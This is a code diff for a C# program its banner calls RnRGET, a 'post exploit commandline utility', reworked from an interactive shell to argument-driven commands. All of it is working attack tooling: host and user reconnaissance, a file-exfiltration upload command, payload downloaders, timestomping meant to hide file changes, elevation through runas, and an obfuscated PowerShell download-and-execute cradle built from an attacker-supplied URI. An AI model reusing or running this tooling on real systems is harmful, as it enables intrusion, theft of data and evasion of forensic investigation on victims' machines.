@@ -12,159 +12,136 @@ using System.Net;
 using System.IO.Compression;
 using System.Text.RegularExpressions;
 
-
 namespace rnr
 {
     class get
     {
-        static void Main()
+        static void Main(string[] args)
         {
-            Console.WriteLine("                                                     __     ");
-            Console.WriteLine("                                                    /  |    ");
-            Console.WriteLine("  ______   _______    ______    ______    ______   _$$ |_   ");
-            Console.WriteLine(" /      \\ /       \\  /      \\  /      \\  /      \\ / $$   | ");
-            Console.WriteLine("/$$$$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |/$$$$$$  |$$$$$$/   ");
-            Console.WriteLine("$$ |  $$/ $$ |  $$ |$$ |  $$/ $$ |  $$ |$$    $$ |  $$ | __ ");
-            Console.WriteLine("$$ |      $$ |  $$ |$$ |      $$ \\__$$ |$$$$$$$$/   $$ |/  |");
-            Console.WriteLine("$$ |      $$ |  $$ |$$ |      $$    $$ |$$       |  $$  $$/ ");
-            Console.WriteLine("$$/       $$/   $$/ $$/        $$$$$$$ | $$$$$$$/    $$$$/  ");
-            Console.WriteLine("                              /  \\__$$ |                    ");
-            Console.WriteLine("                              $$    $$/                     ");
-            Console.WriteLine("                               $$$$$$/                      ");
-            Console.WriteLine("\nlittle recon never hurt nobody......");
-            help();
-            string a = "";
-            for (int i = 1; i <= 100; i++)
+            if (args.Length == 0)
             {
-                Console.Write("\nrnrget$ ");
-                a = Console.ReadLine();
-                var split = a.Split();
-                if (a.Contains("exit"))
+                Console.WriteLine("                                                     __     ");
+                Console.WriteLine("                                                    /  |    ");
+                Console.WriteLine("  ______   _______    ______    ______    ______   _$$ |_   ");
+                Console.WriteLine(" /      \\ /       \\  /      \\  /      \\  /      \\ / $$   | ");
+                Console.WriteLine("/$$$$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |/$$$$$$  |$$$$$$/   ");
+                Console.WriteLine("$$ |  $$/ $$ |  $$ |$$ |  $$/ $$ |  $$ |$$    $$ |  $$ | __ ");
+                Console.WriteLine("$$ |      $$ |  $$ |$$ |      $$ \\__$$ |$$$$$$$$/   $$ |/  |");
+                Console.WriteLine("$$ |      $$ |  $$ |$$ |      $$    $$ |$$       |  $$  $$/ ");
+                Console.WriteLine("$$/       $$/   $$/ $$/        $$$$$$$ | $$$$$$$/    $$$$/  ");
+                Console.WriteLine("                              /  \\__$$ |                    ");
+                Console.WriteLine("                              $$    $$/                     ");
+                Console.WriteLine("                               $$$$$$/                      ");
+                Console.WriteLine("\nlittle recon never hurt nobody......");
+                Console.WriteLine("\nRnRGET - post exploit commandline utility by james haughom jr\n");
+                help();
+                return;
+            }
+            // populate the variables from the arguments
+            for (int i = 0; i < args.Length; i++)
+            {
+                try
                 {
-                    break;
+                    args[i].ToString();
                 }
-                else if (a.StartsWith("help") || a.StartsWith("?") || a.StartsWith("-h") || a.StartsWith("options") || a.StartsWith("//?"))
+                catch
                 {
-                    help();
-                }
-                else if (a == "hostinfo")
-                {
-                    host();
-                }
-                else if (a == "shares")
-                {
-                    shares();
-                }
-                else if (a == "userinfo")
-                {
-                    user();
-                }
-                else if (a == "ps")
-                {
-                    ps();
-                }
-                else if (a.StartsWith("run"))
-                {
-                    var path = split[1];
-                    //var args = split[2];
-                    Process.Start(path);
-                }
-                else if (a.StartsWith("mv"))
-                {
-                    var src = split[1];
-                    var dest = split[2];
-                    mv(src, dest);
-                }
-                else if (a.StartsWith("cp"))
-                {
-                    var src = split[1];
-                    var dest = split[2];
-                    cp(src, dest);
-                }
-                else if (a.StartsWith("del"))
-                {
-                    var path = split[1];
-                    del(path);
-                }
-                else if (a.StartsWith("grep"))
-                {
-                    var pattern = split[1];
-                    var path = split[2];
-                    grep(pattern, path);
-                }
-                else if (a.StartsWith("xfil"))
-                {
-                    var path = split[2];
-                    var uri = split[1];
-                    xfil(path, uri);
-                }
-                else if (a.StartsWith("read") || a.StartsWith("cat"))
-                {
-                    var path = split[1];
-                    readfile(path);
-                }
-                else if (a.StartsWith("ts "))
-                {
-                    var path = split[1];
-                    ts(path);
-                }
-                else if (a == "clear" || a == "cls")
-                {
-                    Console.Clear();
-                }
-                else if (a.StartsWith("dld"))
-                {
-                    var path = split[2];
-                    var uri = split[1];
-                    dnld(path, uri);
-                }
-                else if (a =="pwd")
-                {
-                    pwd();
-                }
-                else if (a == "dir" || a == "ls")
-                {
-                    dir();
-                }
-                else if (a.Contains("enumdir"))
-                {
-                    enumdir();
-                }
-                else if (a.StartsWith("mkdir"))
-                {
-                    var path = split[1];
-                    mkdir(path);
-                }
-                else if (a == "envar")
-                {
-                    envar();
-                }
-                else if (a == "ProcessList")
-                {
-                    ProcessList();
-                }
-                else if (a.StartsWith("kill"))
-                {
-                    var process = split[1];
-                    kill(process);
-                }
-                else if (a == "cd .." || a == "cd..")
-                {
-                    cdDrop();
-                }
-                else if (a.Contains("cd C:"))
-                {
-                    //var split = a.Split();
-                    var dir = split[1];
-                    System.IO.Directory.SetCurrentDirectory(dir);
-                }
-                else
-                {
-                    help();
+                    // Display error if input is missing or invalid
+                    Console.WriteLine(Environment.NewLine + "Invalid Input" +
+                    Environment.NewLine);
+                    Console.ReadLine();
+                    return;
                 }
             }
+            if (args[0] == "help" || args[0] == "?" || args[0] == "/?")
+            {
+                Console.WriteLine("");
+                help();
+            }
+            else if (args[0] == "hostinfo")
+            {
+                hostinfo();
+            }
+            else if (args[0] == "userinfo")
+            {
+                userinfo();
+            }
+            else if (args[0] == "shares")
+            {
+                shares();
+            }
+            else if (args[0] == "ps")
+            {
+                ps();
+            }
+            else if (args[0] == "envar")
+            {
+                envar();
+            }
+            else if (args[0] == "dld")
+            {
+                dld(args[1], args[2]);
+            }
+            else if (args[0] == "cat")
+            {
+                cat(args[1]);
+            } 
+            else if (args[0] == "xfil")
+            {
+                xfil(args[1], args[2]);
+            }
+            else if (args[0] == "ts")
+            {
+                ts(args[1]);
+            }
+            else if (args[0] == "mv")
+            {
+                mv(args[1], args[2]);
+            }
+            else if (args[0] == "cp")
+            {
+                cp(args[1], args[2]);
+            }
+            else if (args[0] == "del")
+            {
+                del(args[1]);
+            }
+            else if (args[0] == "grep")
+            {
+                grep(args[1], args[2]);
+            }
+            else if (args[0] == "enumdir")
+            {
+                enumdir(args[1]);
+            }
+            else if (args[0] == "run")
+            {
+                run(args[1]);
+            }
+            else if (args[0] == "mkdir")
+            {
+                mkdir(args[1]);
+            }
+            else if (args[0]  == "runadmin")
+            {
+                runadmin(args[1]);
+            }
+            else if (args[0] == "dldstr")
+            {
+                dldstr(args[1]);
+            }
+            else if (args[0] == "runps")
+            {
+                runps(args[1]);
+            }
+            else
+            {
+                Console.WriteLine("\nCommand/Argument not recognized.......\n");
+                help();
+            }
+            return;
         }
-        public static void host()
+        static void hostinfo()
         {
             string hostName = Dns.GetHostName();
             string ip = Dns.GetHostByName(hostName).AddressList[0].ToString();
@@ -177,9 +154,9 @@ namespace rnr
             foreach (ManagementObject nic in searcher2.Get())
             {
                 mac += Convert.ToString(nic.Properties["MACAddress"].Value);
-                if (mac.Length <= 17)
+                if (mac.Length <= 17 && mac.Length != 0)
                 {
-                    Console.Write("{0}", mac);
+                    Console.Write("\n{0}", mac);
                 }
 
             }
@@ -197,7 +174,18 @@ namespace rnr
             // add disk size
             // add OS version
         }
-        public static void shares()
+        static void userinfo()
+        {
+            Console.Write("Username: {0}", Environment.UserName);
+            Console.Write("\nDomain\\Username: {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
+            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
+            {
+                WindowsPrincipal principal = new WindowsPrincipal(identity);
+                var admin = principal.IsInRole(WindowsBuiltInRole.Administrator);
+                Console.Write("\nAdmin: " + admin);
+            }
+        }
+        static void shares()
         {
             var wmiPath = string.Format(@"\\{0}\root\cimv2", System.Environment.MachineName);
             var wql = "select * FROM Win32_Share";
@@ -224,67 +212,75 @@ namespace rnr
                 }
             }
         }
-        public static void user()
+        static void ps()
         {
-            Console.Write("Username: {0}", Environment.UserName);
-            Console.Write("\nDomain\\Username: {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
-            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
+            StringBuilder allProcesses = new StringBuilder();
+            allProcesses.Append(String.Format("Handles {0,7} {1,-40}\n", "Id", "ProcessName"));
+            Process[] processList = Process.GetProcesses();
+            foreach (Process process in processList)
             {
-                WindowsPrincipal principal = new WindowsPrincipal(identity);
-                var admin = principal.IsInRole(WindowsBuiltInRole.Administrator);
-                Console.Write("\nAdmin: " + admin);
+                string processInfo = String.Format("{0,7} {1,7} {2,-40}\n", process.HandleCount, process.Id, process.ProcessName);
+                allProcesses.Append(processInfo);
+            }
+            Console.Write(allProcesses.ToString());
+        }
+        static void envar()
+        {
+            var envar = Environment.GetEnvironmentVariables();
+            foreach (DictionaryEntry i in envar)
+            {
+                Console.WriteLine("{0}: {1}", i.Key, i.Value);
             }
         }
-        public static void ps()
+        static void dld(string path, string uri)
         {
-            ProcessList();
+            var wc = new System.Net.WebClient();
+            wc.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)");
+            Uri u = new Uri(uri);
+            wc.DownloadFile(u, path);
         }
-        public static void run()
+        static void cat(string path)
         {
-            //Process.Start(path);
+            Console.Write(System.IO.File.ReadAllText(path));
         }
-        public static void kill(string process)
-        {
-            Process[] proc = Process.GetProcessesByName(process);
-            
-        }
-        public static void mv(string src, string dest)
-        {
-            System.IO.File.Move(src, dest);
-        }
-        public static void cp(string src, string dest)
-        {
-            System.IO.File.Copy(src, dest);
-        }
-        public static void del(string path)
-        {
-            System.IO.File.Delete(path);
-        }
-        public static void ts(string path)
-        {
-            System.IO.File.SetCreationTime(path, System.IO.File.GetCreationTime("C:\\Windows\\System32\\notepad.exe"));
-            System.IO.File.SetLastAccessTime(path, System.IO.File.GetCreationTime("C:\\Windows\\System32\\notepad.exe")); // appear not to be accessed since machine was built
-            System.IO.File.SetLastWriteTime(path, System.IO.File.GetLastWriteTime("C:\\Windows\\System32\\notepad.exe"));
-        }
-        public static void mkdir(string dir)
-        {
-            System.IO.Directory.CreateDirectory(dir);
-        }
-        public static void archive(string dir)
-        {
-            // create archive of files within target directory
-        }
-        public static void xfil(string path, string uri)
+        static void xfil(string path, string uri)
         {
             var wc = new System.Net.WebClient();
             Uri u = new Uri(uri);
             wc.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)");
             wc.UploadFile(u, path);
         }
-        public static void enumdir()
+        static void ts(string path)
         {
-            Console.Write("Path: ");
-            string path = Console.ReadLine();
+            System.IO.File.SetCreationTime(path, System.IO.File.GetCreationTime("C:\\Windows\\System32\\notepad.exe"));
+            System.IO.File.SetLastAccessTime(path, System.IO.File.GetCreationTime("C:\\Windows\\System32\\notepad.exe")); // appear not to be accessed since machine was built
+            System.IO.File.SetLastWriteTime(path, System.IO.File.GetLastWriteTime("C:\\Windows\\System32\\notepad.exe"));
+        }
+        static void mv(string src, string dest)
+        {
+            System.IO.File.Move(src, dest);
+        }
+        static void cp(string src, string dest)
+        {
+            System.IO.File.Copy(src, dest);
+        }
+        static void del(string path)
+        {
+            System.IO.File.Delete(path);
+        }
+        static void grep(string pattern, string path)
+        {
+            var lines = System.IO.File.ReadLines(path);
+            foreach (string line in lines)
+            {
+                if (line.Contains(pattern))
+                {
+                    Console.WriteLine(line);
+                }
+            }
+        }
+        static void enumdir(string path)
+        {
             var files = System.IO.Directory.EnumerateFiles(path);
             var f = "";
             foreach (string file in files)
@@ -304,126 +300,80 @@ namespace rnr
                 Console.WriteLine(item);
             }
         }
-        public static void readfile(string path)
+        static void run(string proc)
         {
-            Console.Write(System.IO.File.ReadAllText(path));
+            Process.Start(proc);
         }
-        public static void grep(string pattern, string path)
+        static void mkdir(string dir)
         {
-            var lines = System.IO.File.ReadLines(path);
-            foreach (string line in lines)
+            System.IO.Directory.CreateDirectory(dir);
+        }
+        private static bool runadmin(string proc)
+        {
+            var SelfProc = new ProcessStartInfo
             {
-                if (line.Contains(pattern))
-                {
-                    Console.WriteLine(line);
-                }
+                UseShellExecute = true,
+                WorkingDirectory = Environment.CurrentDirectory,
+                FileName = proc,
+                Verb = "runas",
+         };
+            try
+            {
+                Process.Start(SelfProc);
+                return true;
+            }
+            catch
+            {
+                Console.WriteLine("Insufficient privs.....");
+                return false;
             }
         }
-        public static void dnld(string path, string uri)
+        static void runps(string uri)
+        {
+            string s1 = "powershell.exe -noexit $asfkjas = (n`E`w-o`Bje`Ct \"n`eT.w`Ebcl`i`EnT\");$lkjd = $asfkjas.\"d`O`wnL`oa`dSTr`iNG\"(\"";
+            string s2 = "\");$erl = ${env:ProgramFiles(x86)}[12] + ${env:ProgramFiles(x86)}[14] + ${env:ProgramFiles(x86)}[18];.$erl $lkjd";
+            string payload = s1 + uri + s2;
+            Console.Write(payload);
+            string formatted = "\"\"\"" + payload + "\"\"\"";
+            /*
+            Process.Start(@"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", formatted);
+            */
+            Console.WriteLine(formatted);
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+            startInfo.Arguments = payload;
+            Process.Start(formatted);
+            
+        }
+        static void dldstr(string uri)
         {
             var wc = new System.Net.WebClient();
             wc.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)");
             Uri u = new Uri(uri);
-            wc.DownloadFile(u, path);
+            string payload = wc.DownloadString(u);
         }
-        public static void pwd()
+        static void help()
         {
-            Console.WriteLine(Environment.CurrentDirectory);
-        }
-        public static void dir()
-        {
-            //var files = System.IO.Directory.EnumerateFiles(Environment.CurrentDirectory);
-            {
-                var files = System.IO.Directory.EnumerateFiles(Environment.CurrentDirectory);
-                var f = "";
-                foreach (string file in files)
-                {
-                    f += "\n" + file;
-                }
-                var directories = System.IO.Directory.EnumerateDirectories(Environment.CurrentDirectory);
-                foreach (string directory in directories)
-                {
-                    f += "\n" + directory;
-                }
-                var list = f.Split();
-                List<string> result = f.Split('\n').ToList();
-                result.Sort();
-                foreach (var item in result)
-                {
-                    Console.WriteLine(item);
-                }
-            }
-        }
-        public static void cdDrop()
-        {
-            string directories = Environment.CurrentDirectory;
-            var list = directories.Split('\\').ToList();
-            list.RemoveAt(list.Count - 1);
-            var j = "";
-            StringBuilder builder = new StringBuilder();
-            foreach (var i in list)
-            {
-                builder.Append(i);
-                builder.Append("\\");
-            }
-            Console.Write(builder);
-            var dir = builder.ToString();
-            System.IO.Directory.SetCurrentDirectory(dir);
-        }
-        public static void gzip()
-        {
-            // add archive/compression
-        }
-        public static void persist()
-        {
-            // add run key 
-        }
-        public static void envar()
-        {
-            var envar = Environment.GetEnvironmentVariables();
-            foreach(DictionaryEntry i in envar)
-            {
-                Console.WriteLine("{0}: {1}", i.Key, i.Value);
-            }
-        }
-        public static void ProcessList()
-        {
-            StringBuilder allProcesses = new StringBuilder();
-            allProcesses.Append(String.Format("Handles {0,7} {1,-40}\n", "Id", "ProcessName"));
-            Process[] processList = Process.GetProcesses();
-            foreach (Process process in processList)
-            {
-                string processInfo = String.Format("{0,7} {1,7} {2,-40}\n", process.HandleCount, process.Id, process.ProcessName);
-                allProcesses.Append(processInfo);
-            }
-            Console.Write(allProcesses.ToString());
-        }
-        public static void help()
-        {
-            Console.WriteLine("\nRnRGET - post exploit commandline utility by james haughom jr\n");
             Console.WriteLine("Command      Description                 Format");
             Console.WriteLine("-------      -----------                 ------");
-            Console.WriteLine("help         display help menu           help, /?, ?");
-            Console.WriteLine("cd           change directory            cd .., cd C:\\Users\\Admin\\Desktop");
-            Console.WriteLine("clear, cls   clear console window        clear, cls");
-            Console.WriteLine("cp           copy files                  cp <source path> <destination path>, cp C:\\Users\\Admin\\sourcefile.txt C:\\Users\\destinationfile.txt");
-            Console.WriteLine("del          delete files                del <target path>, del C:\\Users\\Admin\\targetfile.txt");
-            Console.WriteLine("dld          download payloads           dld <URI> <download path>, dld https://raw.githubusercontent.com/rnranalysis/file.dld C:\\Users\\Admin\\AppData\\Local\\Temp\\file.dld");
-            Console.WriteLine("enumdir      enumerate files             enumdir <target dir>, enumdir C:\\Users\\Admin\\Desktop");
-            Console.WriteLine("exit         exit/terminate process      exit");
-            Console.WriteLine("grep         grep files                  grep <pattern> <path>, grep foo bar.txt");
-            Console.WriteLine("hostinfo     get host information        hostinfo");
-            Console.WriteLine("ls, dir      get files/folders           dir, ls");
-            Console.WriteLine("mv           move files                  mv <source> <destination>, mv C:\\Users\\Admin\\source.file C:\\Users\\Admin\\Desktop\\dest.file");
-            Console.WriteLine("mkdir        create directory            mkdir <target dir>, mkdir C:\\Users\\Admin\\NewDir");
-            Console.WriteLine("ps           get process listing         ps");
-            Console.WriteLine("pwd          get current directory       pwd");
-            Console.WriteLine("read, cat    read text from file         readfile <target path>, readfile C:\\Users\\Admin\\helloworld.txt");
-            Console.WriteLine("run          run processes               run <target path> <cmdline args>, run calc.exe");
-            Console.WriteLine("shares       enumerate shares            shares");
-            Console.WriteLine("ts           timestomp                   ts <target path>, ts C:\\Users\\Admin\\AppData\\Local\\Temp\\targetfile.bin");
-            Console.WriteLine("userinfo     get user information        userinfo");
-            Console.WriteLine("xfil         exfil files                 xfil <URI> <target path>, xfil https://raw.githubusercontent.com/rnranalysis/xfiol.file C:\\Users\\Admin\\xfil.me");
+            Console.WriteLine("help         display help menu           rnrget.exe help, rnrget.exe /?, rnrget.exe ?");
+            Console.WriteLine("cp           copy files                  rnrget.exe cp <source path> <destination path>, rnrget.exe cp C:\\Users\\Admin\\sourcefile.txt C:\\Users\\destinationfile.txt");
+            Console.WriteLine("del          delete files                rnrget.exe del <target path>, rnrget.exe del C:\\Users\\Admin\\targetfile.txt");
+            Console.WriteLine("dld          download payloads           rnrget.exe dld <download path> <URI>, rnrget.exe dld C:\\Users\\Admin\\AppData\\Local\\Temp\\file.dld https://raw.githubusercontent.com/rnranalysis/file.dld");
+            Console.WriteLine("enumdir      enumerate files             rnrget.exe enumdir <target dir>, rnrget.exe enumdir C:\\Users\\Admin\\Desktop");
+            Console.WriteLine("grep         case sensisitive grep       rnrget.exe grep <pattern> <path>, rnrget.exe grep foo bar.txt");
+            Console.WriteLine("hostinfo     get host information        rnrget.exe hostinfo");
+            Console.WriteLine("mv           move files                  rnrget.exe mv <source> <destination>, rnrget.exe mv C:\\Users\\Admin\\source.file C:\\Users\\Admin\\Desktop\\dest.file");
+            Console.WriteLine("mkdir        create directory            rnrget.exe mkdir <target dir>, rnrget.exe mkdir C:\\Users\\Admin\\NewDir");
+            Console.WriteLine("ps           get process listing         rnrget.exe ps");
+            Console.WriteLine("cat          read text from file         rnrget.exe cat <target path>, rnrget.exe cat C:\\Users\\Admin\\helloworld.txt");
+            Console.WriteLine("run          run processes               rnrget.exe run <target path>, rnrget.exe run calc.exe");
+            Console.WriteLine("runadmin     run processes as admin      rnrget.exe runadmin <target path>, runadmin calc.exe");
+            Console.WriteLine("shares       enumerate shares            rnrget.exe shares");
+            Console.WriteLine("ts           timestomp                   rnrget.exe ts <target path>, rnrget.exe ts C:\\Users\\Admin\\AppData\\Local\\Temp\\targetfile.bin");
+            Console.WriteLine("userinfo     get user information        rnrget.exe userinfo");
+            Console.WriteLine("xfil         exfil files                 rnrget.exe xfil <URI> <target path>, rnrget.exe xfil https://raw.githubusercontent.com/rnranalysis/xfiol.file C:\\Users\\Admin\\xfil.me");
+            Console.WriteLine("");
         }
     }
 }
